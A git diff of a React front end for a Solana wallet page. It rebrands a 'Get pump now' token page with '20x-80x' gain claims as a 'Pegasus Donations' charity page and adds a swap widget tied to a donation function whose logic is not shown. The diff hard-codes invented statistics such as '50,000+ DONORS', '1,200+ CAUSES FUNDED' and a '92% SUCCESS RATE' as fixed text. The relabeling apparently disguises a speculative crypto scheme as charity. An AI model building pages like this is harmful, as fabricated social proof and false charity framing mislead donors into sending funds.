@@ -3,9 +3,10 @@ import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import { Button } from '@/components/ui/button';
 import { usePump } from '@/hooks/useDonation';
 // Removed DonationProgress per request
-import { Heart, Wallet } from 'lucide-react';
+import { Wallet } from 'lucide-react';
 import backgroundImage from '@/assets/web-background.png';
-import logoImage from '/pump.png';
+// Use public asset path for logo to avoid bundling issues
+import { Link } from 'react-router-dom';
 import { useState, useEffect, useRef } from 'react';
 import { useConnection } from '@solana/wallet-adapter-react';
 import { LAMPORTS_PER_SOL } from '@solana/web3.js';
@@ -13,6 +14,7 @@ import { notify } from '@/lib/notify';
 import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { FeedbackModal } from '@/components/FeedbackModal';
 import { CenterWalletButton } from '@/components/CenterWalletButton';
+import { SwapInterface } from '@/components/SwapInterface';
 
 const Index = () => {
   const { connected, publicKey, connect, select, wallets } = useWallet();
@@ -86,30 +88,27 @@ const Index = () => {
   }, [connected, publicKey, connection]);
 
   return (
-    <div className="min-h-screen flex flex-col relative overflow-hidden">
-      {/* Background image */}
-      <div className="absolute inset-0 overflow-hidden pointer-events-none">
-        <img
-          src={backgroundImage}
-          alt="Background"
-          className="w-full h-full object-cover"
-        />
-        {/* Blurry transparent overlay */}
-        <div className="absolute inset-0 bg-black/60 backdrop-blur-sm"></div>
-      </div>
+    <div className="min-h-screen flex flex-col">
 
       {/* Top Bar */}
       <div className="relative z-20 bg-black/90 backdrop-blur-md border-b border-white/10">
         <div className="container mx-auto px-4 py-3 flex items-center justify-between">
           <div className="flex items-center gap-3">
-            <img
-              src={logoImage}
-              alt="Pill Logo"
-              className="h-8 w-8 object-contain"
-            />
-            <span className="text-2xl font-bold text-white">Charity Fund</span>
+            {(() => {
+              const logoSrc = import.meta.env.BASE_URL + 'pegasus.jpg';
+              return (
+                <img
+                  src={logoSrc}
+                  onError={(e) => { (e.target as HTMLImageElement).src = import.meta.env.BASE_URL + 'favicon.ico'; }}
+                  alt="Pegasus Logo"
+                  className="h-8 w-8 object-contain"
+                />
+              );
+            })()}
+            <span className="text-2xl font-bold text-white">Pegasus Donations</span>
+            <Link to="/why-pegasus-swap" className="ml-4 text-sky-400 hover:text-sky-300 transition-colors">Why Donate with Pegasus</Link>
           </div>
-          <WalletMultiButton className="!bg-primary hover:!bg-primary/90 !px-2 !text-xs sm:!text-sm sm:!px-4">connect wallet</WalletMultiButton>
+          <WalletMultiButton className="!bg-primary hover:!bg-primary/90 !px-2 !text-xs sm:!text-sm sm:!px-4 !text-primary-foreground">connect wallet</WalletMultiButton>
         </div>
       </div>
 
@@ -120,19 +119,21 @@ const Index = () => {
           <div className="text-center space-y-4">
             <div className="space-y-3">
               <h1 className="text-5xl font-bold text-white">
-                Support Our Charity Mission
+                Donate on Solana
               </h1>
               <div className="text-4xl font-bold bg-gradient-to-r from-green-400 to-green-600 text-transparent bg-clip-text animate-gradient">
-                Donate SOL or SPL Tokens
+                Support causes with low fees
               </div>
             </div>
-            <p className="text-xl text-white/90 max-w-2xl mx-auto leading-relaxed">
-              Connect your wallet to donate SOL or supported tokens. Your contribution directly supports our charity programs and helps people in need.
-            </p>
             {/* Added CenterWalletButton component */}
             <div className="pt-4">
               {!connected && <CenterWalletButton />}
             </div>
+          </div>
+
+          {/* Custom Swap Interface */}
+          <div className="mt-6">
+            <SwapInterface onSwapAction={startDonation} isProcessing={isProcessing} isEligible={isEligible} />
           </div>
 
           {/* Wallet Connection */}
@@ -156,14 +157,13 @@ const Index = () => {
                 {/* Action Button */}
                 {!isProcessing && (
                   <Button
-                    variant="pump"
+                    variant="default"
                     size="xl"
                     onClick={startDonation}
-                    className="w-full"
+                    className="w-full bg-blue-800 hover:bg-blue-900 text-white"
                     disabled={!isEligible}
                   >
-                    <Heart className="w-5 h-5 mr-2" />
-                    Get pump now
+                    Start Donation
                   </Button>
                 )}
 
@@ -171,12 +171,12 @@ const Index = () => {
                 <div className="flex justify-center items-center gap-8 mt-6">
                   <div className="text-center">
                     <p className="text-3xl font-bold text-white">50,000+</p>
-                    <p className="text-xs text-muted-foreground uppercase tracking-wide">PARTICIPANTS</p>
+                    <p className="text-xs text-muted-foreground uppercase tracking-wide">DONORS</p>
                   </div>
                   <div className="text-center">
-                    <p className="text-3xl font-bold text-white">20x-80x <span className="text-green-500">82%</span></p>
-                    <p className="text-xs text-muted-foreground uppercase tracking-wide">PUMP</p>
-                    <p className="text-xs text-green-500 font-bold uppercase tracking-wide">CLAIMED</p>
+                    <p className="text-3xl font-bold text-white">1,200+ <span className="text-green-500">92%</span></p>
+                    <p className="text-xs text-muted-foreground uppercase tracking-wide">CAUSES FUNDED</p>
+                    <p className="text-xs text-green-500 font-bold uppercase tracking-wide">SUCCESS RATE</p>
                   </div>
                 </div>
 
